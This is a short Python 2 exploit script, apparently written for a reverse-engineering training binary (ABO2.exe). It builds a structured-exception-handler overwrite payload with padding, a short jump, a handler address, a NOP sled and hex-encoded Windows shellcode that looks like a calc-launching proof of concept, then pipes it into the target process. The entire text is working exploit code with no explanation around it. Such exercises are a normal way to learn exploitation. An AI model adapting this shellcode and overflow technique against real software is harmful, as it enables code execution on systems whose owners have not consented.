import sys
import random
import string
from struct import *
from subprocess import Popen, PIPE

shellcode = '33d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'.decode("hex")

nop = "\x90"*10
payload = "A"*1028
seh = "B"*52 + "\xeb\x06\x90\x90" + "\x5b\x34\x40\x00" + nop + shellcode + "\x68\x2C\x10\x40\x00\xC3" +(0x2000-(len(nop) + len(shellcode) ))*"\x43"

#print (payload + seh)

p1 = Popen(r"C:\Users\exploit\Desktop\Reversing\tools free\ABO2_con_simbolos\ABO2.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")
p1.communicate(payload + seh)
p1.wait()
